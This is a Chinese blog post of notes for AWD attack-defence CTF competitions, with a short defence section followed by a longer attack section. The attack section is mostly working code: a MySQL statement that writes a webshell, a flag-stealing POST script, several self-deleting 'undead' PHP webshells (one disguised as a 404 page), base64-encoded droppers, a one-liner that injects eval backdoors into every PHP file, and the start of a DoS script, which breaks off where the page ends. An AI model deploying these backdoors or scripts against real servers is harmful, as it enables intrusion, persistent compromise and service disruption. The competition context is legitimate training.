<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta name="description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。" />
      
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> n0rt6&#39;s bolg</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      
<section class="cover">
    
      
      <a class="forkMe" href="https://github.com/Shen-Yu/hexo-theme-ayer"
        target="_blank"><img width="149" height="149" src="/images/forkme.png"
          class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
    
  <div class="cover-frame">
    <div class="bg-box">
      <img src="/images/cover1.jpg" alt="image frame" />
    </div>
    <div class="cover-inner text-center text-white">
      <h1><a href="/">n0rt6&#39;s bolg</a></h1>
      <div id="subtitle-box">
        
        <span id="subtitle"></span>
        
      </div>
      <div>
        
      </div>
    </div>
  </div>
  <div class="cover-learn-more">
    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
  </div>
</section>



<script src="https://cdn.staticfile.org/typed.js/2.0.12/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  <ul class="ads">
    
        <li>
            <a target="_blank" rel="noopener" href="https://curl.qcloud.com/kvO7hb43">
                <img src="https://pic.imgdb.cn/item/62174b452ab3f51d912a5ccc.jpg" width="300" alt="云服务器限时秒杀">
            </a>
        </li>
    
        <li>
            <a target="_blank" rel="noopener" href="https://www.vultr.com/?ref=8630075">
                <img src="https://pic.imgdb.cn/item/62174b452ab3f51d912a5cd7.png" width="300" alt="vultr优惠vps">
            </a>
        </li>
    
</ul>
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-awd总结"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/07/22/awd%E6%80%BB%E7%BB%93/"
    >awd总结</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/07/22/awd%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2023-07-22T05:42:44.000Z" itemprop="datePublished">2023-07-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/">知识点</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <meta name="referrer" content="no-referrer"/>

<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><h3 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h3><blockquote>
<p>压缩命令<br>tar -zcvf <a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a> &#x2F;var&#x2F;www&#x2F;*</p>
</blockquote>
<blockquote>
<p>解压命令<br>tar -zxvf <a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a><br>或者<br>tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;path&#x2F;web<br>tar -zcf &#x2F;tmp&#x2F;name.tar.gz &#x2F;var&#x2F;www&#x2F;html</p>
</blockquote>
<h3 id="批量加waf"><a href="#批量加waf" class="headerlink" title="批量加waf"></a>批量加waf</h3><p># 批量加waf &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录下每个 php 文件前加上 <?php require_once "/tmp/waf.php";?></p>
<blockquote>
<p>find &#x2F;var&#x2F;www&#x2F;html&#x2F; -path &#x2F;var&#x2F;www&#x2F;html&#x2F;513666 -prune -o  -type f -name ‘*.php’|xargs  sed -i ‘1i<?php require_once "/tmp/waf.php";?>‘</p>
</blockquote>
<h3 id="克制不死马"><a href="#克制不死马" class="headerlink" title="克制不死马"></a>克制不死马</h3><p>1.ps aux|grep shell.php 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</p>
<p>2.重启php等web服务(root权限)</p>
<p>3.用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p>
<p>4.创建一个和不死马生成的马一样名字的文件夹。</p>
<p>5.<code>pkill -u www-data</code></p>
<p>6.使用条件竞争的方式，不断循环创建和不死马同名的文件和文件夹，在此次比赛中使用此方式克制<br> 了不死马。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token assign-left variable">dire</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php/"</span>
<span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token string">"/var/www/html/.base.php"</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> <span class="token variable">$file</span>
<span class="token function">mkdir</span> <span class="token variable">$dire</span>
./xx.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="删除指定文件"><a href="#删除指定文件" class="headerlink" title="删除指定文件"></a>删除指定文件</h3><blockquote>
<p>find &#x2F;var&#x2F;www&#x2F;html -name “1.php” -delete</p>
</blockquote>
<h3 id="Shell监控新增文件"><a href="#Shell监控新增文件" class="headerlink" title="Shell监控新增文件"></a>Shell监控新增文件</h3><p>创建文件的时候更改文件创建时间熟悉可能监测不到。</p>
<p>运行命令：<code>sh sh.sh</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token keyword">while</span> <span class="token boolean">true</span>
<span class="token keyword">do</span>
    <span class="token function">find</span> /app/ <span class="token parameter variable">-cmin</span> <span class="token parameter variable">-60</span> <span class="token parameter variable">-type</span> f <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span>
    <span class="token function">sleep</span> <span class="token number">1</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="mysql写入木马"><a href="#mysql写入木马" class="headerlink" title="mysql写入木马"></a>mysql写入木马</h3><p><code>select &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;</code></p>
<h3 id="mysql读取文件"><a href="#mysql读取文件" class="headerlink" title="mysql读取文件"></a>mysql读取文件</h3><pre class="line-numbers language-none"><code class="language-none">select load_file(&quot;E:\\flag.txt&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="1-简单的拿flag脚本-在本地执行"><a href="#1-简单的拿flag脚本-在本地执行" class="headerlink" title="1.简单的拿flag脚本(在本地执行)"></a>1.简单的拿flag脚本(在本地执行)</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url<span class="token operator">=</span><span class="token string">'http://10a6eb1a-ee99-4562-8d4d-cefa0de4c770.challenge.ctf.show/1.php'</span><span class="token comment">#记得改成要攻击的ip</span>
payload<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token string">'45'</span><span class="token punctuation">:</span><span class="token string">'system(\'cat flag.php\');'</span>
<span class="token punctuation">&#125;</span>
r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>payload<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>encoding<span class="token operator">=</span>r<span class="token punctuation">.</span>apparent_encoding
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以结合上面一句话木马使用</p>
<p>我们只要把命令改成读取flag的命令，我们就能为所欲为了。</p>
<h3 id="2-隐藏版不死马（1）"><a href="#2-隐藏版不死马（1）" class="headerlink" title="2.隐藏版不死马（1）"></a>2.隐藏版不死马（1）</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.git.php'</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php @eval($_POST[\'ctf\']) ?>'</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'touch -m -d "2018-12-01 09:10:12" .git.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="不死马2"><a href="#不死马2" class="headerlink" title="不死马2"></a>不死马2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//关掉浏览器，PHP脚本也可以继续执行.</span>
  <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过set_time_limit(0)可以让程序无限制的执行下去</span>
  <span class="token variable">$interval</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// 每隔*秒运行</span>
<span class="token keyword">do</span> <span class="token punctuation">&#123;</span>
  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.123.php'</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"好嗨油！！"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".123.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["ctf"])=="2c3b3b52eb833ba66134aa1b3970b391")&#123;@eval($_POST[a]);&#125; ?>\n'</span><span class="token punctuation">;</span>
  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token variable">$interval</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
    
2c3b3b52eb833ba66134aa1b3970b391解密为ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="不死马3"><a href="#不死马3" class="headerlink" title="不死马3"></a>不死马3</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.git.php'</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_POST["ctf"])=="2c3b3b52eb833ba66134aa1b3970b391")&#123;@eval($_POST[a]);&#125; ?>'</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
    
2c3b3b52eb833ba66134aa1b3970b391解密为ag@ctf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="不死马4（404）"><a href="#不死马4（404）" class="headerlink" title="不死马4（404）"></a>不死马4（404）</h3><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&quot;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;
&lt;p&gt;The requested URL was not found on this server.&lt;&#x2F;p&gt;
&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;
&lt;?php if(md5($_POST[&quot;ctf&quot;])&#x3D;&#x3D;&quot;2c3b3b52eb833ba66134aa1b3970b391&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;

2c3b3b52eb833ba66134aa1b3970b391解密为ag@ctf
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">&lt;?php
header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);
ignore_user_abort(true);
set_time_limit(0);
#unlink(__FILE__);  &#x2F;&#x2F;删除文件自身
$paths&#x3D;&#96;find &#x2F;var&#x2F;www&#x2F;html -type d -writable&#96;;$paths&#x3D;explode(&quot;\n&quot;,$paths);array_pop($paths);
$url &#x3D; $_REQUEST[&quot;url&quot;];
$pass &#x3D; &quot;2c3b3b52eb833ba66134aa1b3970b391&quot;;
$filename &#x3D; $_REQUEST[&quot;filename&quot;];
echo &quot;&lt;!DOCTYPE HTML PUBLIC &#39;-&#x2F;&#x2F;IETF&#x2F;&#x2F;DTD HTML 2.0&#x2F;&#x2F;EN&#39;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;404 Not Found&lt;&#x2F;title&gt;
&lt;&#x2F;head&gt;&lt;body&gt;
&lt;h1&gt;Not Found&lt;&#x2F;h1&gt;
&lt;p&gt;The requested URL was not found on this server.&lt;&#x2F;p&gt;
&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;\n&quot;;


function self()&#123;
    $self&#x3D;substr($_SERVER[&#39;PHP_SELF&#39;],strrpos($_SERVER[&#39;PHP_SELF&#39;],&#39;&#x2F;&#39;)+1);
    return $self;  

&#125;


if($_REQUEST[&quot;m&quot;]&#x3D;&#x3D;&quot;czy&quot;)&#123;

        if(md5($_REQUEST[&quot;pass&quot;]) &#x3D;&#x3D; $pass)&#123;
            echo file_get_contents(&#39;.&#x2F;flag&#39;);
            eval($_REQUEST[&#39;A&#39;]);
        &#125;

&#125;
&#x2F;*
if(&quot;1&quot;!&#x3D;&quot;2&quot;)&#123;
        #while(1)&#123;
        if(count($paths)!&#x3D;&#x3D;0)
        &#123;
                foreach ($paths as $path) &#123;

                        @file_put_contents($path.&quot;&#x2F;.config.php&quot;,file_get_contents(self()));
                        @file_put_contents($path.&quot;&#x2F;-config.php&quot;,file_get_contents(self()));

                &#125;
        &#125;
&#125;
#&#125;
*&#x2F;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload—&gt;POST</p>
<p><strong>m&#x3D;czy&amp;pass&#x3D;ag@ctf</strong></p>
<p>这个也需要在找到对方文件上传漏洞后要上传的php文件。然后在对方的网站上访问该文件后就生成了不死马</p>
<h3 id="base64加密的一句话木马"><a href="#base64加密的一句话木马" class="headerlink" title="base64加密的一句话木马"></a>base64加密的一句话木马</h3><blockquote>
<p>system(‘echo PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2N0ZiddKTsgPz4&#x3D;|base64 -d&gt;&gt;.513.php’);</p>
<p>payload:post</p>
<p>ctf&#x3D;***</p>
</blockquote>
<h3 id="每一个PHP文件加入木马"><a href="#每一个PHP文件加入木马" class="headerlink" title="每一个PHP文件加入木马"></a>每一个PHP文件加入木马</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> /var/www/html/ <span class="token parameter variable">-path</span> /var/www/html/513666 <span class="token parameter variable">-prune</span> <span class="token parameter variable">-o</span>  <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">'*.php'</span><span class="token operator">|</span><span class="token function">xargs</span>  <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'1i&lt;?php eval(\$_POST[czy]);?>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="加密隐藏不死马"><a href="#加密隐藏不死马" class="headerlink" title="加密隐藏不死马"></a>加密隐藏不死马</h3><blockquote>
<p>PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgIEB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmN6eS5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJjenkiXSk9PSIyYzNiM2I1MmViODMzYmE2NjEzNGFhMWIzOTcwYjM5MSIpe0BldmFsKCRfUE9TVFsiY3p5Il0pO30&#x2F;Pic7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpOwogICAgICAgIHVzbGVlcCg1MDApOwogICAgfQo&#x2F;Pg&#x3D;&#x3D;</p>
</blockquote>
<p>命令执行：</p>
<blockquote>
<p>system(‘echo PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CiAgICBzZXRfdGltZV9saW1pdCgwKTsKICAgIEB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLmN6eS5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJjenkiXSk9PSIyYzNiM2I1MmViODMzYmE2NjEzNGFhMWIzOTcwYjM5MSIpe0BldmFsKCRfUE9TVFsiY3p5Il0pO30&#x2F;Pic7CiAgICB3aGlsZSAoMSl7CiAgICAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsJGNvZGUpOwogICAgICAgIHVzbGVlcCg1MDApOwogICAgfQo&#x2F;Pg&#x3D;&#x3D;|base64 -d &gt;.czy.php’);</p>
</blockquote>
<p>明文：</p>
<blockquote>
<?php
ignore_user_abort(true);
set_time_limit(0);
@unlink(__FILE__);
$file = '.czy.php';
$code = '<?php if(md5($_GET["czy"])=="2c3b3b52eb833ba66134aa1b3970b391"){@eval($_POST["czy"]);}?><p>‘;<br>while (1){<br>  file_put_contents($file,$code);<br>  usleep(500);<br>}<br>?&gt;</p>
<p>payload：GET    .czy.php&#x2F;?czy&#x3D;ag@ctf</p>
<p>​				POST    czy&#x3D;phpinfo();</p>
</blockquote>
<h2 id="总结一下线下赛的防护工作中常用的一些命令"><a href="#总结一下线下赛的防护工作中常用的一些命令" class="headerlink" title="总结一下线下赛的防护工作中常用的一些命令"></a>总结一下线下赛的防护工作中常用的一些命令</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ssh <span class="token operator">&lt;</span><span class="token operator">-</span>p 端口<span class="token operator">></span> username@ip
scp 文件路径  username@ip<span class="token operator">:</span>存放路径
cat <span class="token operator">/</span>root<span class="token operator">/</span><span class="token punctuation">.</span>bash_history
#显示最近登录的<span class="token number">5</span>个帐号
last <span class="token operator">-</span>n <span class="token number">5</span><span class="token operator">|</span>awk <span class="token string">'&#123;print $1&#125;'</span>
#显示<span class="token operator">/</span>etc<span class="token operator">/</span>passwd的账户
cat <span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token operator">|</span>awk <span class="token operator">-</span><span class="token constant">F</span> <span class="token string">':'</span> <span class="token string">'&#123;print $1&#125;'</span>
#查看<span class="token constant">UID</span>为<span class="token number">0</span>的帐号
awk <span class="token operator">-</span><span class="token constant">F</span><span class="token operator">:</span> <span class="token string">'&#123;if($3==0)print $1&#125;'</span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd
#查找<span class="token number">777</span>的权限的文件
find <span class="token punctuation">.</span> <span class="token operator">-</span>name <span class="token string">"*.php"</span> <span class="token operator">-</span>perm <span class="token number">4777</span>
#查找<span class="token number">24</span>小时内被修改的<span class="token constant">PHP</span>文件
find <span class="token punctuation">.</span><span class="token operator">/</span> <span class="token operator">-</span>mtime <span class="token number">0</span> <span class="token operator">-</span>name <span class="token string">"*.php"</span>
#查看进程
ps aux <span class="token operator">|</span> grep pid或者进程名　　　　
#查看已建立的网络连接及进程
netstat <span class="token operator">-</span>antulp <span class="token operator">|</span> grep <span class="token constant">EST</span>
#查看指定端口被哪个进程占用
lsof <span class="token operator">-</span>i<span class="token operator">:</span>端口号 或者 netstat <span class="token operator">-</span>tunlp<span class="token operator">|</span>grep 端口号
#结束进程命令
kill <span class="token constant">PID</span>
killall <span class="token operator">&lt;</span>进程名<span class="token operator">></span>
pkill <span class="token operator">&lt;</span>进程名<span class="token operator">></span>
pkill <span class="token operator">-</span>u用户名
#封杀某个<span class="token constant">IP</span>或者ip段
iptables <span class="token operator">-</span><span class="token constant">I</span> <span class="token constant">INPUT</span> <span class="token operator">-</span>s source_ip<span class="token punctuation">[</span><span class="token operator">/</span>mask<span class="token punctuation">]</span> <span class="token operator">-</span>j <span class="token constant">DROP</span>
#禁止从某个主机ssh远程访问登陆到本机
iptable <span class="token operator">-</span>t filter <span class="token operator">-</span><span class="token constant">A</span> <span class="token constant">INPUT</span> <span class="token operator">-</span>s source_ip<span class="token punctuation">[</span><span class="token operator">/</span>mask<span class="token punctuation">]</span> <span class="token operator">-</span>p tcp <span class="token operator">--</span>dport <span class="token number">22</span> <span class="token operator">-</span>j <span class="token constant">DROP</span>
#备份mysql数据库
mysqldump <span class="token operator">-</span>u 用户名 <span class="token operator">-</span>p 密码 数据库名 <span class="token operator">></span> bak<span class="token punctuation">.</span>sql
mysqldump <span class="token operator">--</span>all<span class="token operator">-</span>databases <span class="token operator">></span> bak<span class="token punctuation">.</span>sql
#还原mysql数据库
mysql <span class="token operator">-</span>u 用户名 <span class="token operator">-</span>p 密码 数据库名 <span class="token operator">&lt;</span> bak<span class="token punctuation">.</span>sql
#定时任务，在固定的时间间隔执行指定的系统指令或shell script
crontab <span class="token punctuation">[</span><span class="token operator">-</span>u user<span class="token punctuation">]</span> file_name
crontab <span class="token punctuation">[</span><span class="token operator">-</span>u user<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>e <span class="token operator">|</span><span class="token operator">-</span>l<span class="token operator">|</span> <span class="token operator">-</span>r<span class="token punctuation">]</span>
#检测所有的tcp连接数量及状态
netstat <span class="token operator">-</span>ant<span class="token operator">|</span>awk<span class="token operator">|</span>grep<span class="token operator">|</span>sed <span class="token operator">-</span>e <span class="token operator">-</span>e<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>rn
#查看页面访问排名前十的<span class="token constant">IP</span>
cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">|</span>cut <span class="token operator">-</span>f1 <span class="token operator">-</span>d<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>k  <span class="token operator">-</span>r<span class="token operator">|</span>head <span class="token operator">-</span>　　
#查看页面访问排名前十的<span class="token constant">URL</span>
cat <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>log<span class="token operator">/</span>apache2<span class="token operator">/</span>access<span class="token punctuation">.</span>log<span class="token operator">|</span>cut <span class="token operator">-</span>f4 <span class="token operator">-</span>d<span class="token operator">|</span>sort<span class="token operator">|</span>uniq <span class="token operator">-</span>c<span class="token operator">|</span>sort <span class="token operator">-</span>k  <span class="token operator">-</span>r<span class="token operator">|</span>head <span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="DOS脚本"><a href="#DOS脚本" class="headerlink" title="DOS脚本"></a>DOS脚本</h2><blockquote>
<p>这种情况便是不想玩了，玩不下去了被攻陷了，可以试着给别人一棒子</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">import</span> time
<span class="token keyword">import</span> threading

<span class="token builtin">max</span><span class="token operator">=</span><span class="token number">90000000</span>
port<span class="token operator">=</span><span class="token number">80</span>                 <span class="token comment">#端口</span>
host<span class="token operator">=</span><span class="token string">"192.168.92.154"</span>   <span class="token comment">#IP</span>
page<span class="token operator">=</span><span class="token string">"/index.php"</span>

